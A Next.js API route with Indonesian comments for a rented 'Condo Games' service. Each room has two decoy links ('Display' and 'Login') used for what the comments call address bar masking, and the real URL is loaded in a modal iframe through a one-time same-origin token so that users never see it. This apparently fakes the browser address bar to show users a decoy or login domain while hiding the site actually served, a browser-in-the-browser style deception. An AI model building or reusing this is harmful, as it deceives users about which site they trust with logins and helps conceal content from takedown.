import { NextRequest, NextResponse } from "next/server";
import { and, eq } from "drizzle-orm";
import { db } from "@/db";
import { serverConfigs, tenants, visits } from "@/db/schema";
import { getClientIp, hashIp, safeDomainFromUrl } from "@/lib/auth";
import { makeFrameToken } from "@/lib/frameToken";

export const dynamic = "force-dynamic";

// Klik JOIN: tetap di dalam web (iframe di modal, tanpa tab/address baru).
// Link 1 (display) & Link 2 (login) untuk address bar masking.
// Link 3 (core) TIDAK dikirim mentah — hanya frameSrc same-origin /api/go yang redirect server-side.
export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => ({}));
  const tenantSlug = String(body.tenantSlug || "owner").slice(0, 64);
  const slot = Number(body.slot || 0);
  if (![1, 2, 3].includes(slot)) return NextResponse.json({ error: "Server tidak valid." }, { status: 400 });

  let tenantLabel = "Condo Games";
  if (tenantSlug !== "owner") {
    const t = await db.select().from(tenants).where(eq(tenants.slug, tenantSlug));
    if (t.length === 0) return NextResponse.json({ error: "Link penyewa tidak valid." }, { status: 404 });
    if (!t[0].isActive || new Date(t[0].expiresAt).getTime() < Date.now()) {
      return NextResponse.json({ error: "Masa sewa habis. Link otomatis di-reset.", expired: true }, { status: 410 });
    }
    tenantLabel = t[0].label || tenantSlug;
  }

  const rows = await db
    .select()
    .from(serverConfigs)
    .where(and(eq(serverConfigs.tenantSlug, tenantSlug), eq(serverConfigs.slot, slot)));
  if (rows.length === 0 || !rows[0].isActive) {
    return NextResponse.json({ error: "Server ini belum aktif." }, { status: 404 });
  }
  const cfg = rows[0];
  const link1 = (cfg.decoy1 || "").trim();
  const link2 = (cfg.decoy2 || "").trim();
  const link3 = (cfg.realUrl || "").trim();

  // WAJIB 3/3 terisi
  const missing: string[] = [];
  if (!link1) missing.push("Link 1 (Display)");
  if (!link2) missing.push("Link 2 (Login)");
  if (!link3) missing.push("Link 3 (Core)");
  if (missing.length > 0) {
    return NextResponse.json(
      { error: `Server 0${slot} belum lengkap: ${missing.join(", ")} wajib diisi oleh Owner/Penyewa.` },
      { status: 404 }
    );
  }

  try {
    const ip = getClientIp(req);
    await db.insert(visits).values({
      tenantSlug,
      serverSlot: slot,
      type: "join",
      ipHash: hashIp(ip + String(Date.now()).slice(0, 8)),
      ua: (req.headers.get("user-agent") || "").slice(0, 180),
    });
  } catch {}

  // frameSrc same-origin + token sekali pakai (10 menit) — Link 3 diselesaikan
  // server-side via redirect, tidak tampil di HTML/JS, tidak bisa dishare/disimpan
  const frameSrc = `/api/go?tenant=${encodeURIComponent(tenantSlug)}&server=${slot}&frame=1&t=${encodeURIComponent(
    makeFrameToken(tenantSlug, slot)
  )}`;

  return NextResponse.json({
    ok: true,
    room: {
      slot,
      title: cfg.title,
      imageUrl: cfg.imageUrl,
      online: cfg.online,
      maxOnline: cfg.maxOnline,
      gameBy: cfg.gameBy || "",
      gameDesc: cfg.gameDesc || "",
      maturity: cfg.maturity || "",
      tenantLabel,
      // Address bar masking (ditampilkan ke user, dari input panel)
      link1_display: link1,
      link2_login: link2,
      // Iframe memakai frameSrc same-origin — Link 3 mentah TIDAK dikirim ke klien
      frameSrc,
      displayDomain: safeDomainFromUrl(link1),
    },
  });
}
